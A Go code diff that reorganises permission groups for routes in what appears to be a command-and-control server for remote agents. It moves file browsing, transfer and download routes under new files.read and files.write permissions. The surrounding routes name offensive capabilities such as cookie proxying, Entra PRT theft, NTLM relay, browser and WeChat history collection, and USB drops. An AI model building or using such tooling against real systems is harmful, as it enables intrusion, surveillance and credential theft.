@@ -29,11 +29,8 @@ func (s *Server) registerAgentRoutes(auth *gin.RouterGroup) {
 		// beacon. Read-only, so a viewer can see the badge without write perms.
 		agentsRead.GET("/agents/:id/control", s.handleAgentControl)
 		agentsRead.GET("/agents/:id/shell", s.handleShellPage)
-		agentsRead.GET("/agents/:id/files", s.handleFileBrowserPage)
 		agentsRead.GET("/agents/:id/screen", s.handleScreenMonitorPage)
 		agentsRead.GET("/agents/:id/tasks", s.handleGetAgentTasks)
-		agentsRead.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
-		agentsRead.GET("/agents/:id/tasks/:taskId/output", s.handleDownloadTaskOutput)
 		agentsRead.GET("/api/agents", s.handleListAgents)
 		agentsRead.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
 		agentsRead.GET("/api/agents/:id/screenshots", s.handleListAgentScreenshots)
@@ -54,6 +51,19 @@ func (s *Server) registerAgentRoutes(auth *gin.RouterGroup) {
 		agentsRead.POST("/api/ai/run-review", s.handleAIRunReview)
 		agentsRead.GET("/api/handover/export", s.handleHandoverExport)
 		agentsRead.GET("/api/scheduler/oneshot", s.handleListOneShotTasks)
+	}
+
+	filesRead := auth.Group("/")
+	filesRead.Use(middleware.RequirePermission(db.PermFilesRead))
+	{
+		filesRead.GET("/agents/:id/files", s.handleFileBrowserPage)
+	}
+
+	agentTaskRead := auth.Group("/")
+	agentTaskRead.Use(middleware.RequirePermission(db.PermAgentsRead, db.PermFilesRead))
+	{
+		agentTaskRead.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
+		agentTaskRead.GET("/agents/:id/tasks/:taskId/output", s.handleDownloadTaskOutput)
 	}
 
 	// Task duration statistics: which task types are getting slow. tasks.read is enough - it only
@@ -132,7 +142,6 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/window/close", s.handleWindowClose)
 		agentCmd.POST("/clipboard/get", s.handleClipboardGet)
 		agentCmd.POST("/clipboard/set", s.handleClipboardSet)
-		agentCmd.POST("/find", s.handleFindFiles)
 		agentCmd.POST("/hostinfo", s.handleRequestHostInfo)
 		agentCmd.POST("/reg/get", s.handleRegGet)
 		agentCmd.POST("/reg/set", s.handleRegSet)
@@ -140,14 +149,12 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/reboot", s.handleReboot)
 		agentCmd.POST("/wallpaper", s.handleWallpaper)
 		agentCmd.POST("/shutdown", s.handleShutdown)
-		agentCmd.POST("/drives", s.handleListDrives)
 		agentCmd.POST("/beacon_now", s.handleBeaconNow)
 		agentCmd.POST("/services", s.handleListServices)
 		agentCmd.POST("/portscan", s.handlePortScan)
 		agentCmd.POST("/netstat", s.handleNetstat)
 		agentCmd.POST("/users", s.handleUsers)
 		agentCmd.POST("/av", s.handleAV)
-		agentCmd.POST("/download_url", s.handleDownloadURL)
 		agentCmd.POST("/uninstall", s.handleUninstall)
 		agentCmd.POST("/set_sleep", s.handleSetSleep)
 		agentCmd.POST("/keep_awake", s.handleKeepAwake)
@@ -181,10 +188,8 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.GET("/cookie_proxy/netscape", s.handleCookieProxyNetscape)
 		agentCmd.POST("/sccm_recon", s.handleSccmRecon)
 		agentCmd.POST("/entra_prt", s.handleEntraPRT)
-		agentCmd.POST("/file_hunt", s.handleFileHunt)
 		agentCmd.POST("/screen_trigger/start", s.handleScreenTriggerStart)
 		agentCmd.POST("/screen_trigger/stop", s.handleScreenTriggerStop)
-		agentCmd.POST("/usb_enum", s.handleUSBEnum)
 		agentCmd.POST("/usb_drop", s.handleUSBDrop)
 		agentCmd.POST("/browser_history", s.handleBrowserHistory)
 		agentCmd.POST("/wechat_history", s.handleWeChatHistory)
@@ -206,27 +211,6 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.GET("/rportfwd/status", s.handleRPortFwdStatus)
 		agentCmd.POST("/rportfwd/start", s.handleRPortFwdRelayStart)
 		agentCmd.POST("/rportfwd/stop", s.handleRPortFwdRelayStop)
-
-		agentCmd.POST("/download", s.handleDownload)
-
-		agentCmd.POST("/files/ls", s.handleListDir)
-		agentCmd.POST("/files/search", s.handleFileSearch)
-		agentCmd.POST("/files/scan", s.handleFileScan)
-		agentCmd.POST("/files/thumb", s.handleFileThumb)
-		agentCmd.GET("/files/thumb/:thumb", s.handleFileThumbGet)
-		agentCmd.POST("/files/delete", s.handleFileDelete)
-		agentCmd.POST("/files/read", s.handleFileRead)
-		agentCmd.POST("/files/mkdir", s.handleFileMkdir)
-		agentCmd.POST("/files/rename", s.handleFileRename)
-		agentCmd.POST("/files/chmod", s.handleFileChmod)
-		agentCmd.POST("/files/write", s.handleFileWrite)
-		agentCmd.GET("/files/history", s.handleFileHistory)
-		agentCmd.GET("/files/revisions/:taskId", s.handleFileRevision)
-		agentCmd.POST("/transfers", s.handleCreateTransfer)
-		agentCmd.PUT("/transfers/:transfer_id/chunk", s.handlePushTransferChunk)
-		agentCmd.POST("/transfers/:transfer_id/resume", s.handleResumeTransfer)
-		agentCmd.POST("/transfers/:transfer_id/pause", s.handlePauseTransfer)
-		agentCmd.DELETE("/transfers/:transfer_id", s.handleCancelTransfer)
 
 		agentCmd.POST("/screen/start", s.handleStartScreenMonitor)
 		agentCmd.POST("/screen/stop", s.handleStopScreenMonitor)
@@ -256,14 +240,46 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/relay/stop", s.handleNTLMRelayStop)
 	}
 
-	// Listing and downloading transfers only needs agents.read; the mutating
-	// transfer routes above stay on agents.write.
-	agentRead := auth.Group("/agents/:id")
-	agentRead.Use(middleware.RequirePermission(db.PermAgentsRead))
+	filesRead := auth.Group("/agents/:id")
+	filesRead.Use(middleware.RequirePermission(db.PermFilesRead))
 	{
-		agentRead.GET("/transfers", s.handleListTransfers)
-		agentRead.GET("/transfers/:transfer_id", s.handleGetTransfer)
-		agentRead.GET("/transfers/:transfer_id/file", s.handleGetTransferFile)
+		filesRead.POST("/files/ls", s.handleListDir)
+		filesRead.POST("/files/search", s.handleFileSearch)
+		filesRead.POST("/files/scan", s.handleFileScan)
+		filesRead.POST("/files/thumb", s.handleFileThumb)
+		filesRead.GET("/files/thumb/:thumb", s.handleFileThumbGet)
+		filesRead.POST("/files/read", s.handleFileRead)
+		filesRead.GET("/files/history", s.handleFileHistory)
+		filesRead.GET("/files/revisions/:taskId", s.handleFileRevision)
+		filesRead.POST("/find", s.handleFindFiles)
+		filesRead.POST("/drives", s.handleListDrives)
+		filesRead.POST("/usb_enum", s.handleUSBEnum)
+		filesRead.GET("/transfers", s.handleListTransfers)
+		filesRead.GET("/transfers/:transfer_id", s.handleGetTransfer)
+		filesRead.GET("/transfers/:transfer_id/file", s.handleGetTransferFile)
+		filesRead.POST("/transfers/:transfer_id/resume", s.handleResumeTransfer)
+	}
+
+	filesWrite := auth.Group("/agents/:id")
+	filesWrite.Use(middleware.RequirePermission(db.PermFilesWrite))
+	{
+		filesWrite.POST("/files/delete", s.handleFileDelete)
+		filesWrite.POST("/files/mkdir", s.handleFileMkdir)
+		filesWrite.POST("/files/rename", s.handleFileRename)
+		filesWrite.POST("/files/chmod", s.handleFileChmod)
+		filesWrite.POST("/files/write", s.handleFileWrite)
+		filesWrite.POST("/download", s.handleDownload)
+		filesWrite.POST("/download_url", s.handleDownloadURL)
+		filesWrite.POST("/file_hunt", s.handleFileHunt)
+		filesWrite.PUT("/transfers/:transfer_id/chunk", s.handlePushTransferChunk)
+		filesWrite.POST("/transfers/:transfer_id/pause", s.handlePauseTransfer)
+		filesWrite.DELETE("/transfers/:transfer_id", s.handleCancelTransfer)
+	}
+
+	transferCreate := auth.Group("/agents/:id")
+	transferCreate.Use(middleware.RequirePermission(db.PermFilesRead, db.PermFilesWrite))
+	{
+		transferCreate.POST("/transfers", s.handleCreateTransfer)
 	}
 }
 
